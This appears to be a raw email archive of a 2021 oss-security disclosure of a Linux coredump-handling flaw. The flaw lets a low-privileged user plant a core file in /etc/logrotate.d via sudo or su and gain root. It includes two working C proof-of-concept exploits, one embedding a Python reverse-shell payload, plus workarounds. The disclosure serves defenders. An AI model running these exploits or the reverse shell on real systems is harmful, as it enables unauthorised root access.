X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["9809" "Wednesday" "20" "October" "2021" "15:45:49" "+0300" "Itai Greenhut" "itai.greenhut@gmail.com" nil "294" "[oss-security] Core-dump handing issues with suid binaries" nil nil nil "10" nil nil (number mark "U       itai.greenhu Oct 20  294/9809  " thread-indent "\"[oss-security] Core-dump handing issues with suid binaries\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Core-dump handing issues with suid binaries" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 17861 invoked by uid 550); 20 Oct 2021 13:25:39 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 31845 invoked from network); 20 Oct 2021 12:46:12 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20210112;
        h=mime-version:from:date:message-id:subject:to;
        bh=HdbBy/CYCxzwc1e6b3njPIOqNfb5+9q508/TuwWfZZ4=;
        b=ADA7+ZgE9YxYlE2qU4y8s6iAVosSNvQBoTxMGiwtphjMn1z8kquEUHKWr4j2LG/jH3
         tyOGyIpWzk7sPUPP0vxzIUGMEjVeZ7tiTeFm/vt0H9kvyFgM0Se8mq7BUTXSYi3eBJAb
         uLmplBv4orz7dLk8FP7hd8GceBRe7E4mgnI20Hrk7TFfN690NuD/mHLX4/4Rwf7pbqMk
         k+7F7+iIvggCA9YWvg7RWtQNimRLTaRqsMfUQwE0XhDE+TUfEqWowvL/UUzTtYyHMnLz
         x96q1j5Ql+oH51L5tGqayfi2/Z2MO5gy9VJ5R0lmw84FPE4ff+cep9rJB9MZMAujTvxC
         +Yyg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=HdbBy/CYCxzwc1e6b3njPIOqNfb5+9q508/TuwWfZZ4=;
        b=vtLkJqArfXBArTqvdVcr3bvikRh0nWnUjaEayunUySL/c5RAzmPqLlZVaUId6gPPzS
         eNx7MtWFxWGR09M63VUBcUjF4/BydTGlZ5eSdsL3yfAdDJzTDVl5UPh5Ve/31QCo2jR2
         /dfWHMjRCjEKwB1I1Gayb2ISH6I9+kDhrZFf2e4wzWidQFul2fiHc6jVnWO2IcpgDvBN
         PRVWhIRfrsu8UDhpGahOodRMZLt6ipLpqVfXP9UE6Qg/leZDxzhpCY+5WKT/dGVSOuP+
         ADAMqMlBTQNqQUrr1RPxKBkKuTzQV+4MLpYHqpw/92PywIUCCnGewznmvFeV7reeiwkQ
         oHsg==
X-Gm-Message-State: AOAM533zcg1mKj1E6Pai38zKvRGnFazrwAajZYVARfFZAjqADXHKb1P/
	l02z0konm80OhcckGFDD0KCnRRMQLl+eBnqUNsBvOxwuk5E=
X-Google-Smtp-Source: ABdhPJwNvETdSzC+UeRN7vJ2dhaRp+alrkVn70cdwpCsekC9RvXp4r1jIY0CEr6ToWQ2s3OKw1EbTWPIyOjTeYsjf18=
X-Received: by 2002:a05:6102:cd2:: with SMTP id g18mr41442269vst.25.1634733960376;
 Wed, 20 Oct 2021 05:46:00 -0700 (PDT)
MIME-Version: 1.0
From: Itai Greenhut <itai.greenhut@gmail.com>
Date: Wed, 20 Oct 2021 15:45:49 +0300
Message-ID: <CAExjoYv2aT+DjmBvT55OuSBqKpEeZwBkiCf_yA1kMNR=-ALpew@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="00000000000002b35205cec829d4"
Subject: [oss-security] Core-dump handing issues with suid binaries

--00000000000002b35205cec829d4
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hello,

As the maximum allowed 14 days of embargo has passed, this is a public
announcement of a vulnerability in the linux kernel that can lead to
exploitation of suid binaries.


Vulnerabilities in coredump handling can lead to LPE

=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

SUMMARY
--------------------------------------------------------------

We found a technique that can be used to write coredump files into
arbitrary directories (even those requiring root permissions). These files
can be leveraged to execute arbitrary code via logrotate.

The issue can be exploited with sudo (tested on Ubuntu 21.04 + debian 11)
on a machine that is configured to allow a user to run a command as root.


Issue:
--------------------------------------------------------------

Every process has a =E2=80=9Cdumpable=E2=80=9D integer attribute. The value=
 of this
attribute determines what to do when a process receives signals that
usually result in a coredump.

We will focus on the behavior of suid binaries.

There are three possible values:
0 - Coredump won't be produced for a suid program
1 - Coredump will be produced when possible
2 - Coredump will be produced for suid programs, only if core_pattern is an
absulote path or a pipe to a usermode program.


When executing a suid binary on a default configuration (core_pattern is
relative and suid_dumpable is 0 or 2) the process won't create a coredump
for the suid processes.

We noticed that if we have a suid binary that uses execve, the new dumpable
value is determined in the "begin_new_exec" function, from fs/exec.c (code
taken from kernel 5.13.12):

"""

if (bprm->interp_flags & BINPRM_FLAGS_ENFORCE_NONDUMP ||
    !(uid_eq(current_euid(), current_uid()) &&
      gid_eq(current_egid(), current_gid())))
    set_dumpable(current->mm, suid_dumpable);
else
    set_dumpable(current->mm, SUID_DUMP_USER);

"""

We can see in this code that if a suid binary changes its privileges to
have the real uid equal effective uid, and real gid equal effective gid,
then the process after execve will have a dumpable value of SUID_DUMP_USER
(1). If that process were to crash, a coredump file would be generated with
uid:gid permissions.


Exploitation:
---------------------------------------------------------

We tested the exploit on Ubuntu 21.04 and Debian 11 (with slight
modifications to the code).

To exploit this behavior, we first had to find a suid binary that meets the
following requirements:

1. A root suid binary.
2. Sets uid and gid to 0 (setuid(0) and setgid(0) are called).
3. Uses execve.


After investigating a few binaries, we found that sudo is suitable for our
purpose.
With sudo, the issue only affects machines configured via /etc/sudoers to
let a low-privileges user to run a command as root (the exact command
doesn't matter, as we will show later).

We have successfully exploited the following configuration on the latest
Ubuntu release ('user' is a low privileged user).

"""
user ALL=3D /usr/bin/true
"""

The above configuration means that 'user' can only run the /usr/bin/true
binary as root, which does almost nothing.

When running /usr/bin/true with sudo, sudo will call setuid(0) and
setgid(0), then fork and execve the /usr/bin/true binary. After the execve,
the dumpable value of the new process will be set to 1.

Now we only need to make sure that we can crash *any* child process of
sudo, and a core file will be generated for that process.

We have two options on how to crash the child process.

1. we can set RLIMIT_CPU to 0 in the parent that calls sudo. Child
processes inherit the rlimit values from their parents, and those values
are also preserved across execve.
Therefore, the /usr/bin/true binary will crash almost immediately after
beginning execution, and create a coredump file in the current directory of
the process.

Providing 0 to RLIMIT_CPU is available from commit
(2bbdbdae05167c688b6d3499a7dab74208b80a22)

2. We can fork a new process and execute the suid binary, meanwhile at the
parent process we will =E2=80=9Cinsert=E2=80=9D CTRL+\ (SIGQUIT) character =
to the terminal
(with \x1C character on ioctl TIOCSTI).

The SIGQUIT character in the tty driver will send SIGQUIT signal to the
process group of the parent results in a coredump of the child of suid
process (That way we bypass the fact that we cannot send signals to the
child of suid).

Now, to get the privilege escalation, all we have to do is to set the
current working directory to /etc/logrotate.d/, and include a valid
logrotate configuration in the memory of the crashed process.

To include the logrotate configuration in the coredump file, we transfer
the configuration through specific environment variables, that the children
of sudo binary inherit (sudo filters most of them but we were able to use
XAUTHORITY).

The PoC must run multiple times because sometimes the sudo program times
out before the child is executed.


Sudo PoC (tested on Ubuntu 21.04):

---------------------------------------------------------

1. Start with a low-privileged user
2. Add configuration so the user will be able to execute 'true' as root.
3. Touch /var/crash/test.log
4. Change the directory to /etc/logrotate.d/
5. Run the PoC code multiple times until a coredump file is created in
/etc/logrotate.d/

"""
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/resource.h>


int main(int argc, char **argv, char **envp)
{
char *nargv[] =3D {"sudo", "true", NULL};
struct rlimit lim;

char *xauth_env =3D "\n/var/crash/test.log{\n su root root\n daily\n size=
=3D0\n
firstaction\n /usr/bin/python3 -c \"import sys,socket,os,pty;
s=3Dsocket.socket();s.connect(('127.0.0.1', 1234));[os.dup2(s.fileno(), fd)
for fd in (0,1,2)]; pty.spawn('/bin/sh')\";\n endscript\n}\n\nA\"";

setenv("XAUTHORITY", xauth_env, 1);
chdir("/etc/logrotate.d");

lim.rlim_cur =3D 0;
lim.rlim_max =3D RLIM_INFINITY;
setrlimit(RLIMIT_CPU, &lim);
lim.rlim_cur =3D RLIM_INFINITY;
lim.rlim_max =3D RLIM_INFINITY;
setrlimit(RLIMIT_CORE, &lim);

execve("/usr/bin/sudo", nargv, envp);
return 0;
}
"""

6. A coredump file should now be present in /etc/logrotate.d/core. When
logrotate runs, it will read the configuration files from
/etc/logrotate.d/. logrotate's configuration format is not strict, and it
will read the coredump until reaching a valid configuration (present in the
dump as part of the XAUTHORITY environment variable value), which will
connect to our listening server as root.


Another example:
---------------------------------------------------------

While investigating other binaries trying to find a binary that satisfies
our requirements, we found that there are several default binaries that
authenticate through pam.

This was tested on Centos 7 which still receive security update until 2024
(centos 8 will not work because their coredumps are on absolute paths)

One of the binaries is /usr/bin/su which eventually calls pam_unix.so.
CentOS 7 ships with an outdated version of pam which will call a helper
(/usr/sbin/unix_chkpwd) when selinux is enabled (which is in centos 7).

Before executing /usr/sbin/unix_chkpwd pam_unix will call setuid(0) which
will satisfy our requirements from before. Because CentOS 7 comes with an
old kernel which we can=E2=80=99t use RLIMIT_CPU to generate dump with (The=
 process
dies too fast) we will use our second method.


We are able to generate coredump in specified directory. Before executing
the child pam_unix wipes all the previous environment. As for now we
haven=E2=80=99t found a way yet to include a logrotate configuration in the=
 memory
of the child=E2=80=99s coredump.


Su PoC (tested on CentOS 7):
---------------------------------------------------------

1. Start with a low-privileged user
2. Run the PoC code multiple times (with incremental sleep time) until a
coredump file is created in /etc/logrotate.d/

"""
#include <sys/ioctl.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/resource.h>


int main(int argc, char **argv, char **envp)
{
    struct rlimit lim;
    lim.rlim_cur =3D RLIM_INFINITY;
    lim.rlim_max =3D RLIM_INFINITY;
    setrlimit(RLIMIT_CORE, &lim);

    chdir("/etc/logrotate.d/");
    pid_t pid =3D fork();
    if (0 =3D=3D pid)
    {
        char *nargv[] =3D {"su", "-m", "root", NULL};
        execve("/usr/bin/su", nargv, envp);
        exit(1);
    }
    else
    {
        usleep(atoi(argv[1]));
        char code =3D '\x1C';
        ioctl(STDIN_FILENO, TIOCSTI, &code);
    }
    return 0;
}

"""

Workarounds:
---------------------------------------------------------
This exploit can be mitigated using a few workarounds.

1. Change /proc/sys/kernel/core_pattern to an absolute, safe directory
(this way, logrotate cannot be triggered).
2. Apparently, at some point in time, pam_limits.so was removed from the
PAM configuration of sudo (in Debian and Ubuntu). Adding this module to the
sudo's PAM configuration and setting RLIMIT_CORE to 0 makes sudo immune to
this vulnerability.


As discussed with security@kernel.org and linux-distros@vs.openwall.org a
permanent fix to this vulnerability will probably need to be inside the
linux kernel, one of the suggestions that came up was to reset RLIMIT_CORE
of a suid process to 0 by default. Any fix to this issue would probably
break user expectations from the linux kernel because suddenly their
coredump won't be created.



Best Regards,
Itai Greenhut
Aleph Research by HCL AppScan

--00000000000002b35205cec829d4--
